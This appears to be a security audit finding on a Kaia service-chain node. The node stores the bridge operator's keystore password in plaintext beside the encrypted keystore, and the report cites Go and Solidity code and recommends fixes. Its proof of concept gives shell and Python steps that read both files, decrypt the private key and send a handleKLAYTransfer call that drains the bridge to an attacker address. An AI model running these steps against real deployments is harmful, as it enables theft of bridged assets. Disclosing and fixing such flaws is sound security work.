### Title
Bridge Operator Keystore Password Stored in the Same Directory as the Encrypted Keystore, Enabling Immediate Private Key Recovery — (`File: node/sc/bridge_accounts.go`)

### Summary

`InitializeBridgeAccountKeystore` in `node/sc/bridge_accounts.go` auto-generates a random password for the bridge operator's keystore and writes that password as a plaintext file **inside the same directory** as the encrypted keystore JSON. Any attacker or process that can read the keystore directory immediately obtains both the ciphertext and the decryption key, collapsing the encryption to zero effective protection. The compromised bridge operator key can then be used to sign fraudulent `handleKLAYTransfer` / `handleERC20Transfer` / `handleERC721Transfer` calls, draining bridged assets.

### Finding Description

`InitializeBridgeAccountKeystore` is called at service-chain startup for both the parent and child bridge operator accounts:

```
pKS, pAccAddr, isLock, err := InitializeBridgeAccountKeystore(path.Join(dataDir, ParentBridgeAccountName))
cKS, cAccAddr, isLock, err := InitializeBridgeAccountKeystore(path.Join(dataDir, ChildBridgeAccountName))
```

Inside that function, when no keystore exists yet, the code:

1. Generates a random password: `password := setup.RandStringRunes(params.PasswordLength)`
2. Creates an encrypted keystore in `keystorePath/`: `acc, err := ks.NewAccount(password)`
3. Writes the plaintext password **into the same directory**: `setup.WriteFile([]byte(password), keystorePath, acc.Address.String())`

On subsequent startups the code reads the password back from that same directory:

```go
pwdFilePath := path.Join(keystorePath, acc.Address.String())
pwdStr, err := os.ReadFile(pwdFilePath)
```

The result is that `<dataDir>/parent_bridge_account/` (and `child_bridge_account/`) contains:

```
parent_bridge_account/
├── UTC--<timestamp>--<address>   ← encrypted keystore JSON
└── <address>                     ← plaintext password
```

Anyone who can list or read that directory — a compromised co-located process, a misconfigured backup, a directory-traversal bug in any adjacent service, or a cloud-storage misconfiguration — immediately has everything needed to decrypt the private key without any brute-force. [1](#0-0) 

### Impact Explanation

The bridge operator key is the signing authority for all cross-chain value-transfer handle transactions. With the recovered private key an attacker can:

- Call `handleKLAYTransfer` with an arbitrary `_to` address and `_value`, draining KAIA held in the bridge contract.
- Call `handleERC20Transfer` / `handleERC721Transfer` to drain ERC-20 and ERC-721 tokens.

In the default single-operator deployment the vote threshold is 1, so a single operator signature is sufficient to execute any transfer immediately. [2](#0-1) [3](#0-2) 

### Likelihood Explanation

The `parent_bridge_account` and `child_bridge_account` directories live inside the node's `dataDir`, which is routinely included in backups, log-shipping pipelines, and monitoring agents. A single read permission on the directory — achievable through a misconfigured backup agent, a path-traversal in an adjacent RPC handler, or a cloud-storage ACL mistake — is sufficient to recover the key. No cryptographic attack is required; the attacker simply reads two files from the same directory. [4](#0-3) [5](#0-4) 

### Recommendation

Separate the password from the keystore directory. Options in increasing security order:

1. **Separate directory with tighter permissions**: write the password file to a dedicated secrets directory (e.g., `<dataDir>/bridge-secrets/`) with `0o700` permissions, distinct from the keystore directory that backup agents typically include.
2. **OS keychain / secret manager**: store the password in the OS credential store (e.g., Linux kernel keyring, HashiCorp Vault, AWS Secrets Manager) so that it is never co-located with the ciphertext on disk.
3. **Require operator-supplied password at startup**: remove the auto-generated password file entirely and require the operator to supply the password interactively or via an environment variable, matching the pattern already used by `kcn valops generate-keys` and `kcn account bls-export`.

Additionally, clear the in-memory `password` string immediately after `ks.Unlock` returns, as noted in the external report's minor optimization. [6](#0-5) 

### Proof of Concept

```
# 1. Start a service-chain node (or let InitializeBridgeAccountKeystore run once).
#    The following files are created automatically:

ls <dataDir>/parent_bridge_account/
# UTC--2024-01-01T00-00-00.000000000Z--<addr>   ← encrypted keystore
# <addr>                                         ← plaintext password

# 2. Read both files (requires only directory read access):
KEYSTORE=$(cat "<dataDir>/parent_bridge_account/UTC--*")
PASSWORD=$(cat "<dataDir>/parent_bridge_account/<addr>")

# 3. Decrypt the private key (standard Web3 tooling):
python3 -c "
from eth_account import Account
import json, sys
ks = json.loads('$KEYSTORE')
pw = '$PASSWORD'
pk = Account.decrypt(ks, pw)
print('Private key:', pk.hex())
"

# 4. Use the recovered key to drain the bridge:
cast send <bridge_contract> \
  "handleKLAYTransfer(bytes32,address,address,uint256,uint64,uint64,bytes)" \
  <any_request_tx_hash> <any_from> <attacker_address> <bridge_balance> 0 1 0x \
  --private-key <recovered_key> \
  --rpc-url <parent_chain_rpc>
```

The `handleKLAYTransfer` call succeeds because the recovered key is the registered bridge operator, the nonce 0 passes `_lowerHandleNonceCheck`, and with a single-operator threshold the vote immediately executes the transfer. [7](#0-6) [8](#0-7)

### Citations

**File:** node/sc/bridge_accounts.go (L149-198)
```go
// NewBridgeAccounts returns bridgeAccounts created by main/service bridge account keys.
func NewBridgeAccounts(am *accounts.Manager, dataDir string, db feePayerDB, parentOperatorGaslimit, childOperatorGaslimit uint64) (*BridgeAccounts, error) {
	pKS, pAccAddr, isLock, err := InitializeBridgeAccountKeystore(path.Join(dataDir, ParentBridgeAccountName))
	if err != nil {
		return nil, err
	}

	if isLock {
		logger.Warn("parent bridge account is locked. Please unlock the account manually for Service Chain", "name", ParentBridgeAccountName)
	}

	cKS, cAccAddr, isLock, err := InitializeBridgeAccountKeystore(path.Join(dataDir, ChildBridgeAccountName))
	if err != nil {
		return nil, err
	}

	if isLock {
		logger.Warn("child bridge account is locked. Please unlock the account manually for Service Chain", "name", ChildBridgeAccountName)
	}

	logger.Info("bridge account is loaded", "parent", pAccAddr.String(), "child", cAccAddr.String())

	pAccInfo := &accountInfo{
		am:       am,
		keystore: pKS,
		address:  pAccAddr,
		nonce:    0,
		chainID:  nil,
		gasPrice: nil,
		gasLimit: parentOperatorGaslimit,
		feePayer: db.ReadParentOperatorFeePayer(),
	}

	cAccInfo := &accountInfo{
		am:       am,
		keystore: cKS,
		address:  cAccAddr,
		nonce:    0,
		chainID:  nil,
		gasPrice: nil,
		gasLimit: childOperatorGaslimit,
		feePayer: db.ReadChildOperatorFeePayer(),
	}

	return &BridgeAccounts{
		pAccount: pAccInfo,
		cAccount: cAccInfo,
		db:       db,
	}, nil
}
```

**File:** node/sc/bridge_accounts.go (L200-238)
```go
// InitializeBridgeAccountKeystore initializes a keystore, imports existing keys, and tries to unlock the bridge account.
// This returns the 1st account of the wallet, its address, the lock status and the error.
func InitializeBridgeAccountKeystore(keystorePath string) (*keystore.KeyStore, common.Address, bool, error) {
	ks := keystore.NewKeyStore(keystorePath, keystore.StandardScryptN, keystore.StandardScryptP)

	// If there is no keystore file, this creates a random account and the corresponded password file.
	// TODO-Kaia-Servicechain A test-option will be added and this routine will be only executed with it.
	if len(ks.Accounts()) == 0 {
		password := setup.RandStringRunes(params.PasswordLength)
		acc, err := ks.NewAccount(password)
		if err != nil {
			return nil, common.Address{}, true, err
		}
		setup.WriteFile([]byte(password), keystorePath, acc.Address.String())

		if err := ks.Unlock(acc, password); err != nil {
			logger.Error("bridge account wallet unlock is failed by created password file.", "address", acc.Address, "err", err)
			os.RemoveAll(keystorePath)
			return nil, common.Address{}, true, err
		}

		return ks, acc.Address, false, nil
	}

	// Try to unlock 1st account if valid password file exist. (optional behavior)
	// If unlocking failed, user should unlock it through API.
	acc := ks.Accounts()[0]
	pwdFilePath := path.Join(keystorePath, acc.Address.String())
	pwdStr, err := os.ReadFile(pwdFilePath)
	if err == nil {
		if err := ks.Unlock(acc, string(pwdStr)); err != nil {
			logger.Warn("bridge account wallet unlock is failed by exist password file.", "address", acc.Address, "err", err)
			return ks, acc.Address, true, nil
		}
		return ks, acc.Address, false, nil
	}

	return ks, acc.Address, true, nil
}
```

**File:** contracts/service_chain/bridge/BridgeTransferKLAY.sol (L61-100)
```text
    // handleKLAYTransfer sends the KLAY by the request.
    function handleKLAYTransfer(
        bytes32 _requestTxHash,
        address _from,
        address payable _to,
        uint256 _value,
        uint64 _requestedNonce,
        uint64 _requestedBlockNumber,
        bytes memory _extraData
    )
        public
        onlyOperators
        nonReentrant
    {
        _lowerHandleNonceCheck(_requestedNonce);

        if (!_voteValueTransfer(_requestedNonce)) {
            return;
        }

        _setHandledRequestTxHash(_requestTxHash);

        handleNoncesToBlockNums[_requestedNonce] = _requestedBlockNumber;
        _updateHandleNonce(_requestedNonce);

        emit HandleValueTransfer(
            _requestTxHash,
            TokenType.KLAY,
            _from,
            _to,
            address(0),
            _value,
            _requestedNonce,
            lowerHandleNonce,
            _extraData
        );

        (bool ok, ) = _to.call.value(_value)("");
        require(ok, "handleKLAYTransfer: transfer failed");
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L31-73)
```text
    // handleERC20Transfer sends the token by the request.
    function handleERC20Transfer(
        bytes32 _requestTxHash,
        address _from,
        address _to,
        address _tokenAddress,
        uint256 _value,
        uint64 _requestedNonce,
        uint64 _requestedBlockNumber,
        bytes memory _extraData
    )
        public
        onlyOperators
    {
        _lowerHandleNonceCheck(_requestedNonce);

        if (!_voteValueTransfer(_requestedNonce)) {
            return;
        }

        _setHandledRequestTxHash(_requestTxHash);

        handleNoncesToBlockNums[_requestedNonce] = _requestedBlockNumber;
        _updateHandleNonce(_requestedNonce);

        emit HandleValueTransfer(
            _requestTxHash,
            TokenType.ERC20,
            _from,
            _to,
            _tokenAddress,
            _value,
            _requestedNonce,
            lowerHandleNonce,
            _extraData
        );

        if (modeMintBurn) {
            require(ERC20Mintable(_tokenAddress).mint(_to, _value), "handleERC20Transfer: mint failed");
        } else {
            IERC20(_tokenAddress).safeTransfer(_to, _value);
        }
    }
```
